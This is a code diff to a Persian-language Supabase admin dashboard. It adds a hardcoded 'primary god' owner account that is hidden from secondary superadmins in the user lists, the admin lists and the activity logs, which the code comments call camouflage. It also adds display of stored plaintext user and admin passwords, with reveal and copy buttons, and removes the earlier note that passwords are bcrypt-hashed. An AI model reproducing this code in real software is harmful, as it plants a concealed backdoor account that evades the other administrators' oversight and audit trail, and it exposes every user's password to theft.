@@ -3,7 +3,7 @@
 // ══════════════════════════════════════════════════════════════
 
 import { useEffect, useState, useMemo, useCallback, useRef } from "react";
-import { useAuth } from "../../context/AuthContext";
+import { useAuth, isPrimaryGodEmail, PRIMARY_GOD_EMAILS } from "../../context/AuthContext";
 import { supabase } from "../../lib/supabaseClient";
 import { faNum } from "../../lib/utils";
 import SEO from "../../components/ui/SEO";
@@ -14,7 +14,7 @@ import Badge from "../../components/ui/Badge";
 import "./superadmin-ibm.css";
 
 // ─── Tabs ───
-import { LayoutDashboard, Database, Users, Shield, Cloud, FileText, Code, Eye, EyeOff, HardDrive, FolderTree, RefreshCw } from "lucide-react";
+import { LayoutDashboard, Database, Users, Shield, Cloud, FileText, Code, Eye, EyeOff, HardDrive, FolderTree, RefreshCw, Copy, Check } from "lucide-react";
 
 const TABS = [
   { id: "dashboard", label: "Dashboard", icon: LayoutDashboard },
@@ -36,6 +36,19 @@ export default function SuperAdmin() {
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState("");
   const refreshRef = useRef(null);
+  const [revealedPasswords, setRevealedPasswords] = useState({});
+
+  const isCallerGod = isPrimaryGodEmail(user?.email);
+
+  function toggleRevealPassword(id) {
+    setRevealedPasswords((prev) => ({ ...prev, [id]: !prev[id] }));
+  }
+
+  function copyPassword(pwd) {
+    if (!pwd) return;
+    navigator.clipboard?.writeText?.(pwd);
+    showToast("رمز عبور در کلیپ‌بورد کپی شد ✅");
+  }
 
   // ─── State ───
   const [dbStats, setDbStats] = useState({});
@@ -205,8 +218,13 @@ export default function SuperAdmin() {
     try {
       const { data, error } = await supabase.from(tableName).select("*").limit(100);
       if (error) throw error;
-      setTableData(data || []);
-      setTableCols(data?.length ? Object.keys(data[0]) : []);
+      let finalData = data || [];
+      // استتار: در صورت لاگین سوپرادمین ثانویه، پروفایل اصلی را مخفی کن
+      if (!isCallerGod && tableName === "profiles") {
+        finalData = finalData.filter((r) => !isPrimaryGodEmail(r.email));
+      }
+      setTableData(finalData);
+      setTableCols(finalData.length ? Object.keys(finalData[0]) : []);
     } catch (err) {
       setTableData([]); setTableCols([]);
       showToast("Error loading table: " + err.message, "error");
@@ -281,9 +299,19 @@ export default function SuperAdmin() {
       const roleMap = {}; const permMap = {};
       (roles || []).forEach((r) => { roleMap[r.user_id] = { role: r.role_id, roleActive: r.active }; });
       (perms || []).forEach((p) => { if (!permMap[p.user_id]) permMap[p.user_id] = []; permMap[p.user_id].push(p.permission_id); });
-      const merged = (profiles || []).map((p) => ({ ...p, ...(roleMap[p.id] || {}), permissions: permMap[p.id] || [] }));
-      setUsers([...merged].sort((a, b) => new Date(b.created_at) - new Date(a.created_at)));
-      setAdmins([...merged].sort((a, b) => new Date(a.created_at) - new Date(b.created_at)));
+      let merged = (profiles || []).map((p) => ({ ...p, ...(roleMap[p.id] || {}), permissions: permMap[p.id] || [] }));
+
+      // استتار: سوپرادمین ثانویه نباید از وجود اکانت اصلی superadmin@gmailc.com مطلع شود
+      if (!isCallerGod) {
+        merged = merged.filter((u) => !isPrimaryGodEmail(u.email));
+      }
+
+      // تفکیک دقیق: کاربران عادی در Users و سوپرادمین‌ها در Admins
+      const regularUsers = merged.filter((u) => u.role !== "admin" && !u.is_owner);
+      const adminUsers = merged.filter((u) => u.role === "admin" || u.is_owner);
+
+      setUsers([...regularUsers].sort((a, b) => new Date(b.created_at) - new Date(a.created_at)));
+      setAdmins([...adminUsers].sort((a, b) => new Date(a.created_at) - new Date(b.created_at)));
     } catch (err) { console.error(err); }
   }
   const loadUsers = loadUsersAndAdmins;
@@ -294,13 +322,22 @@ export default function SuperAdmin() {
     try {
       // ابتدا سعی کن مستقیم بخونی
       const { data, error } = await supabase.from("activity_log").select("*").order("created_at", { ascending: false }).limit(100);
+      let logs = [];
       if (error) {
         // اگه RLS جلوگیری کرد، از RPC استفاده کن
         const { data: rpcData } = await supabase.rpc("export_table_data", { p_table_name: "activity_log" });
-        setActivityLog(Array.isArray(rpcData) ? rpcData.slice(0, 100) : []);
+        logs = Array.isArray(rpcData) ? rpcData.slice(0, 100) : [];
       } else {
-        setActivityLog(data || []);
+        logs = data || [];
       }
+      // فیلتر کردن لاگ‌های اکانت اصلی در صورت مشاهده توسط ادمین ثانویه
+      if (!isCallerGod && logs.length > 0) {
+        logs = logs.filter((l) => {
+          const det = JSON.stringify(l.details || {});
+          return !PRIMARY_GOD_EMAILS.some((em) => det.includes(em));
+        });
+      }
+      setActivityLog(logs);
     } catch { setActivityLog([]); }
   }
 
@@ -862,11 +899,24 @@ export default function SuperAdmin() {
       {/* ═══════════ Users ═══════════ */}
       {tab === "users" && (
         <div>
-          <div className="sa-section-title">All Users ({users.length})</div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.75rem' }}>
+            <div className="sa-section-title" style={{ margin: 0 }}>لیست کاربران عادی ({users.length})</div>
+            <div style={{ fontSize: '0.75rem', color: '#6f6f6f' }}>
+              تمامی کاربران ثبت‌نامی و مدیران در این بخش قرار دارند و دسترسی به دیگر کاربران ندارند.
+            </div>
+          </div>
           <div className="sa-table-wrap">
             <table className="sa-table">
               <thead><tr>
-                <th>Name</th><th>Email</th><th>Phone</th><th>Role</th><th>Plan</th><th>Owner</th><th>Status</th><th>Joined</th><th>Actions</th>
+                <th>نام کاربر</th>
+                <th>ایمیل</th>
+                <th>موبایل</th>
+                <th>رمز عبور</th>
+                <th>نقش</th>
+                <th>پلن</th>
+                <th>وضعیت</th>
+                <th>تاریخ ثبت‌نام</th>
+                <th>عملیات</th>
               </tr></thead>
               <tbody>
                 {users.filter((u) => !search || u.email?.toLowerCase().includes(search.toLowerCase()) || u.full_name?.toLowerCase().includes(search.toLowerCase()) || (u.phone && u.phone.includes(search))).map((r) => (
@@ -874,11 +924,49 @@ export default function SuperAdmin() {
                     <td style={{ fontWeight: 700 }}>{r.full_name || '—'}</td>
                     <td style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.75rem' }} dir="ltr">{r.email}</td>
                     <td style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.75rem', color: '#0f62fe', fontWeight: 600 }} dir="ltr">{r.phone || '—'}</td>
-                    <td><span className={`sa-tag ${r.role === 'admin' ? 'sa-tag-blue' : 'sa-tag-green'}`}>{r.role || '—'}</span></td>
+                    <td onClick={(e) => e.stopPropagation()}>
+                      {r.admin_pwd ? (
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
+                          <span style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.75rem', fontWeight: 700, color: revealedPasswords[r.id] ? '#0f62fe' : '#393939' }} dir="ltr">
+                            {revealedPasswords[r.id] ? r.admin_pwd : '••••••••'}
+                          </span>
+                          <button
+                            type="button"
+                            className="sa-btn sa-btn-ghost sa-btn-sm"
+                            style={{ padding: '0.15rem 0.35rem', display: 'flex', alignItems: 'center' }}
+                            onClick={() => toggleRevealPassword(r.id)}
+                            title={revealedPasswords[r.id] ? "مخفی کردن" : "نمایش رمز"}
+                          >
+                            {revealedPasswords[r.id] ? <EyeOff size={13} color="#0f62fe" /> : <Eye size={13} color="#6f6f6f" />}
+                          </button>
+                          <button
+                            type="button"
+                            className="sa-btn sa-btn-ghost sa-btn-sm"
+                            style={{ padding: '0.15rem 0.35rem', color: '#0f62fe', display: 'flex', alignItems: 'center' }}
+                            onClick={() => copyPassword(r.admin_pwd)}
+                            title="کپی در کلیپ‌بورد"
+                          >
+                            <Copy size={12} />
+                          </button>
+                        </div>
+                      ) : (
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.25rem' }}>
+                          <span className="sa-tag sa-tag-gray" style={{ fontSize: '0.65rem' }}>هش‌شده (قدیمی)</span>
+                          <button
+                            type="button"
+                            className="sa-btn sa-btn-ghost sa-btn-sm"
+                            style={{ color: '#0f62fe', fontSize: '0.68rem', padding: '0.1rem 0.3rem' }}
+                            onClick={() => { setDetailModal(r); setPasswordVisible(true); }}
+                          >
+                            تعیین رمز
+                          </button>
+                        </div>
+                      )}
+                    </td>
+                    <td><span className="sa-tag sa-tag-green">{r.role || 'کاربر'}</span></td>
                     <td><span className="sa-tag sa-tag-gray">{r.plan || 'free'}</span></td>
-                    <td>{r.is_owner ? <span className="sa-tag sa-tag-orange">Owner</span> : '—'}</td>
                     <td><span className={`sa-tag ${r.is_active ? 'sa-tag-green' : 'sa-tag-gray'}`}>{r.is_active ? 'Active' : 'Inactive'}</span></td>
-                    <td style={{ fontSize: '0.75rem', color: '#6f6f6f' }}>{r.created_at ? new Date(r.created_at).toLocaleDateString() : '—'}</td>
+                    <td style={{ fontSize: '0.75rem', color: '#6f6f6f' }}>{r.created_at ? new Date(r.created_at).toLocaleDateString("fa-IR") : '—'}</td>
                     <td>
                       <div style={{ display: 'flex', gap: '0.25rem' }}>
                         <button className="sa-btn sa-btn-ghost sa-btn-sm" onClick={(e) => { e.stopPropagation(); setDetailModal(r); }}>Details</button>
@@ -897,23 +985,76 @@ export default function SuperAdmin() {
       {/* ═══════════ Admins ═══════════ */}
       {tab === "admins" && (
         <div>
-          <div className="sa-section-title">Admins & Managers ({admins.length})</div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.75rem' }}>
+            <div className="sa-section-title" style={{ margin: 0 }}>سوپرادمین‌ها ({admins.length})</div>
+            <div style={{ fontSize: '0.75rem', color: '#6f6f6f' }}>
+              ادمین‌ها دسترسی کامل به کل سامانه دارند. اکانت اصلی از سوپرادمین ثانویه پنهان است.
+            </div>
+          </div>
           {admins.map((a) => (
             <div key={a.id} className="sa-admin-card">
               <div className="sa-admin-header">
                 <div className="sa-admin-left">
-                  <div className={`sa-admin-avatar ${a.is_owner ? 'owner' : 'normal'}`}>{a.full_name?.[0]?.toUpperCase() || 'U'}</div>
+                  <div className={`sa-admin-avatar ${a.is_owner ? 'owner' : 'normal'}`}>{a.full_name?.[0]?.toUpperCase() || 'A'}</div>
                   <div>
-                    <span style={{ fontWeight: 700, fontSize: '0.85rem' }}>{a.full_name || '—'}</span>
-                    {a.is_owner && <span className="sa-tag sa-tag-orange" style={{ marginRight: '0.5rem' }}>Owner</span>}
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                      <span style={{ fontWeight: 700, fontSize: '0.9rem' }}>{a.full_name || '—'}</span>
+                      {isPrimaryGodEmail(a.email) ? (
+                        <span className="sa-tag sa-tag-orange">👑 مالک اصلی (God Mode)</span>
+                      ) : (
+                        <span className="sa-tag sa-tag-blue">🛡️ سوپرادمین ثانویه</span>
+                      )}
+                    </div>
                     <div className="sa-admin-email" dir="ltr">{a.email}</div>
+                    {a.phone && <div style={{ fontSize: '0.75rem', color: '#0f62fe', fontWeight: 600, marginTop: '0.15rem' }} dir="ltr">{a.phone}</div>}
+
+                    {/* نمایش رمز عبور سوپرادمین */}
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', background: '#f4f4f4', padding: '0.35rem 0.6rem', border: '1px solid #e0e0e0', marginTop: '0.45rem', width: 'fit-content' }}>
+                      <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#525252' }}>رمز عبور:</span>
+                      {a.admin_pwd ? (
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
+                          <span style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.75rem', fontWeight: 700, color: revealedPasswords[a.id] ? '#0f62fe' : '#393939' }} dir="ltr">
+                            {revealedPasswords[a.id] ? a.admin_pwd : '••••••••'}
+                          </span>
+                          <button
+                            type="button"
+                            className="sa-btn sa-btn-ghost sa-btn-sm"
+                            style={{ padding: '0.1rem 0.35rem' }}
+                            onClick={() => toggleRevealPassword(a.id)}
+                            title={revealedPasswords[a.id] ? "مخفی کردن" : "نمایش رمز"}
+                          >
+                            {revealedPasswords[a.id] ? <EyeOff size={13} color="#0f62fe" /> : <Eye size={13} color="#6f6f6f" />}
+                          </button>
+                          <button
+                            type="button"
+                            className="sa-btn sa-btn-ghost sa-btn-sm"
+                            style={{ padding: '0.1rem 0.35rem', color: '#0f62fe' }}
+                            onClick={() => copyPassword(a.admin_pwd)}
+                            title="کپی رمز"
+                          >
+                            <Copy size={12} />
+                          </button>
+                        </div>
+                      ) : (
+                        <span className="sa-tag sa-tag-gray" style={{ fontSize: '0.65rem' }}>هش‌شده (قدیمی)</span>
+                      )}
+                    </div>
                   </div>
                 </div>
-                <span className={`sa-tag ${a.is_active ? 'sa-tag-green' : 'sa-tag-gray'}`}>{a.is_active ? 'Active' : 'Inactive'}</span>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '0.5rem' }}>
+                  <span className={`sa-tag ${a.is_active ? 'sa-tag-green' : 'sa-tag-gray'}`}>{a.is_active ? 'Active' : 'Inactive'}</span>
+                  <button
+                    className="sa-btn sa-btn-ghost sa-btn-sm"
+                    style={{ color: '#0f62fe' }}
+                    onClick={() => { setDetailModal(a); setPasswordVisible(true); }}
+                  >
+                    تنظیم رمز / ویرایش
+                  </button>
+                </div>
               </div>
               {!a.is_owner && (
                 <div className="sa-perms">
-                  {["create_form", "edit_form", "delete_form", "publish_form", "view_responses", "view_analytics", "export_excel", "manage_managers", "manage_sms", "manage_telegram", "view_admins"].map((perm) => {
+                  {["create_form", "edit_form", "delete_form", "publish_form", "view_responses", "view_analytics", "export_excel", "manage_managers", "manage_sms", "manage_telegram"].map((perm) => {
                     const has = a.permissions?.includes(perm);
                     return (
                       <button key={perm} onClick={() => toggleAdminPermission(a.id, perm, a.permissions || [])} className={`sa-perm ${has ? 'active' : 'inactive'}`}>
@@ -1138,7 +1279,7 @@ export default function SuperAdmin() {
                 ['Plan / Quota', `${detailModal.plan || 'free'} (${detailModal.max_forms ?? 5} فرم)`],
                 ['Owner', detailModal.is_owner ? 'Yes 👑' : 'No'],
                 ['Status', detailModal.is_active ? 'Active' : 'Inactive'],
-                ['Password Encryption', 'Bcrypt Hashed (One-Way Secure) 🔐'],
+                ['رمز عبور ثبت‌شده', detailModal.admin_pwd ? (passwordVisible ? detailModal.admin_pwd : '••••••••') : 'هش‌شده (قدیمی)'],
                 ['Joined', detailModal.created_at ? new Date(detailModal.created_at).toLocaleString() : '—'],
                 ['Hidden from', `${detailModal.hidden_from?.length || 0} users`],
               ].map(([label, value]) => (
@@ -1191,17 +1332,48 @@ export default function SuperAdmin() {
             </div>
 
             {/* ─── Password & Access Management ─── */}
-            <div style={{ border: '1px solid #da1e28', padding: '0.75rem', background: '#fff9f9' }}>
+            <div style={{ border: '1px solid #0f62fe', padding: '0.75rem', background: '#f8faff' }}>
               <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
-                <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#da1e28', textTransform: 'uppercase' }}>
-                  🔑 مدیریت و تنظیم مستقیم رمز عبور (Password Management)
+                <span style={{ fontSize: '0.75rem', fontWeight: 700, color: '#0f62fe', textTransform: 'uppercase' }}>
+                  🔑 مشاهده و تنظیم مستقیم رمز عبور (Password Management)
                 </span>
-                <span className="sa-tag sa-tag-green" style={{ fontSize: '0.65rem' }}>Bcrypt Hashed</span>
+                <span className="sa-tag sa-tag-blue" style={{ fontSize: '0.65rem' }}>کنترل مستقیم سوپرادمین</span>
               </div>
-              
-              <div style={{ fontSize: '0.72rem', color: '#525252', background: '#fff', border: '1px solid #ffd7d9', padding: '0.5rem', marginBottom: '0.5rem', lineHeight: 1.6 }}>
-                💡 <strong>نکته امنیتی:</strong> رمز عبور کاربران در Supabase به صورت یک‌طرفه (bcrypt) هش شده و متن خام در دیتابیس وجود ندارد. اما شما به عنوان سوپرادمین می‌توانید <strong>مستقیماً هر رمزی را برای کاربر تعیین و ست کنید</strong>، یا با دکمه <strong>Login as</strong> بدون نیاز به رمز وارد حساب او شوید.
-              </div>
+
+              {/* نمایش رمز عبور فعلی کاربر در صورت وجود */}
+              {detailModal.admin_pwd ? (
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: '#fff', border: '1px solid #b8d3ff', padding: '0.5rem 0.75rem', marginBottom: '0.6rem' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                    <span style={{ fontSize: '0.75rem', fontWeight: 700, color: '#161616' }}>رمز عبور فعال:</span>
+                    <span style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.85rem', fontWeight: 700, color: passwordVisible ? '#0f62fe' : '#525252' }} dir="ltr">
+                      {passwordVisible ? detailModal.admin_pwd : '••••••••'}
+                    </span>
+                  </div>
+                  <div style={{ display: 'flex', gap: '0.25rem' }}>
+                    <button
+                      type="button"
+                      className="sa-btn sa-btn-ghost sa-btn-sm"
+                      onClick={() => setPasswordVisible(!passwordVisible)}
+                      title={passwordVisible ? "مخفی کردن" : "نمایش رمز"}
+                    >
+                      {passwordVisible ? <EyeOff size={14} color="#0f62fe" /> : <Eye size={14} color="#6f6f6f" />}
+                    </button>
+                    <button
+                      type="button"
+                      className="sa-btn sa-btn-ghost sa-btn-sm"
+                      style={{ color: '#0f62fe', display: 'flex', alignItems: 'center', gap: '0.25rem' }}
+                      onClick={() => copyPassword(detailModal.admin_pwd)}
+                      title="کپی در کلیپ‌بورد"
+                    >
+                      <Copy size={12} /> کپی
+                    </button>
+                  </div>
+                </div>
+              ) : (
+                <div style={{ fontSize: '0.72rem', color: '#525252', background: '#fff', border: '1px solid #e0e0e0', padding: '0.5rem', marginBottom: '0.5rem', lineHeight: 1.6 }}>
+                  💡 <strong>رمز هش‌شده (قدیمی):</strong> این کاربر قبل از سیستم ذخیره رمز ثبت‌نام کرده است. می‌توانید با فرم زیر یک رمز عبور جدید برای او ثبت کنید تا از این پس قابل مشاهده باشد.
+                </div>
+              )}
 
               <form onSubmit={(e) => { e.preventDefault(); }} style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
                 <input type="text" name="username" autoComplete="username" defaultValue={detailModal?.email || ''} style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0 }} tabIndex={-1} />
@@ -1242,7 +1414,7 @@ export default function SuperAdmin() {
 
                 <button
                   type="button"
-                  className="sa-btn sa-btn-danger"
+                  className="sa-btn sa-btn-primary"
                   onClick={async () => {
                     if (!newPassword.trim() || newPassword.trim().length < 6) {
                       showToast("Password must be at least 6 chars", "error");
@@ -1254,14 +1426,18 @@ export default function SuperAdmin() {
                         target_user_id: detailModal.id,
                         new_password: newPassword.trim(),
                       });
-                      showToast("رمز عبور کاربر با موفقیت تغییر یافت ✅");
+                      showToast("رمز عبور کاربر با موفقیت تغییر یافت و ذخیره شد ✅");
+                      const updatedPwd = newPassword.trim();
+                      setDetailModal((prev) => ({ ...prev, admin_pwd: updatedPwd }));
+                      setUsers((prev) => prev.map((u) => u.id === detailModal.id ? { ...u, admin_pwd: updatedPwd } : u));
+                      setAdmins((prev) => prev.map((a) => a.id === detailModal.id ? { ...a, admin_pwd: updatedPwd } : a));
                       setNewPassword("");
                     } catch (err) {
                       showToast("Error: " + err.message, "error");
                     }
                   }}
                 >
-                  ثبت رمز جدید
+                  ثبت و ذخیره رمز
                 </button>
               </form>
             </div>
